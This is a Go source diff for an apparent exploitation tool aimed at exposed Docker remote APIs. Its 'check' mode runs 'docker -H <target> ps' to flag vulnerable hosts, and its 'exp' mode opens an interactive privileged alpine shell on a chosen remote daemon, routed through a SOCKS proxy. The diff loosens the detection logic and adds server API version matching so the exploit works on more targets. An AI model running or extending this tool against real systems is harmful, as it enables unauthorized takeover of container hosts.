@@ -38,7 +38,10 @@ func main() {
 		}
 		for _, _ = range targets {
 			b := <-c1
-			fmt.Printf("%v\n", b)
+			for k, v := range b {
+				fmt.Printf("是否存在漏洞(%v)：%v\n", k, v)
+			}
+
 		}
 		//wg.Wait()
 	case "exp":
@@ -154,12 +157,8 @@ func check(t string, ch chan map[interface{}]interface{}) {
 		cmd := exec.Command("docker", "-H", t, "ps")
 		checkSocksProxy(cmd)
 		//fmt.Println(cmd)
-		out, err := cmd.CombinedOutput()
-		if err != nil {
-			b[t] = false
-			return b
-		}
-		if strings.Contains(string(out), "CONTAINER") && strings.Contains(string(out), "ID") && strings.Contains(string(out), "IMAGE") && strings.Contains(string(out), "COMMAND") && strings.Contains(string(out), "CREATED") {
+		out, _ := cmd.CombinedOutput()
+		if strings.Contains(string(out), "CONTAINER") && strings.Contains(string(out), "IMAGE") || (strings.Contains(string(out), "client API version") && strings.Contains(string(out), "server API version")) {
 			b[t] = true
 			return b
 		} else {
@@ -186,13 +185,40 @@ func exp() {
 		}
 	}
 	t = targets[i]
+	cmdVersion := exec.Command("docker", "-H", t, "version")
+	checkSocksProxy(cmdVersion)
+	out, _ := cmdVersion.CombinedOutput()
+	var version string
+	if strings.Contains(string(out), "API version") {
+		reg := regexp.MustCompile(`server API version: (?s:([\d\.]{4}))`)
+		//reg := regexp.MustCompile(`Version:[0-9\.\s]+API version:\s+?(?s:([\S]{4}))\s+Go version`)
+		sss := reg.FindAllStringSubmatch(string(out), -1)
+
+		for _, h2 := range sss {
+			if len(h2) < 2 {
+				fmt.Println("利用失败")
+				os.Exit(-1)
+			}
+			version = strings.TrimSpace(h2[1])
+		}
+	} else {
+		fmt.Println("利用失败")
+		os.Exit(-1)
+	}
+
 	cmd := exec.Command("docker", "-H", t, "run", "-it", "--rm", "--privileged", "alpine", "/bin/sh")
+	fmt.Println(cmd)
 	checkSocksProxy(cmd)
+	if version != "" {
+		cmd.Env = append(cmd.Env, fmt.Sprintf(`DOCKER_API_VERSION=%s`, strings.TrimSpace(version)))
+	}
+	//fmt.Println(cmd.Env)
 	cmd.Stdin = os.Stdin
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	err := cmd.Start()
 	if err != nil {
+		fmt.Println(err)
 		return
 	}
 	err = cmd.Wait()
@@ -212,7 +238,7 @@ func checkSocksProxy(cmd *exec.Cmd) {
 		os.Exit(-1)
 	}
 
-	var cmdEnv []string
-	cmdEnv = append(cmdEnv, "ALL_PROXY="+proxy)
-	cmd.Env = cmdEnv
+	//var cmdEnv []string
+	//cmdEnv = append(cmdEnv, "ALL_PROXY="+proxy)
+	cmd.Env = append(cmd.Env, "ALL_PROXY="+proxy)
 }
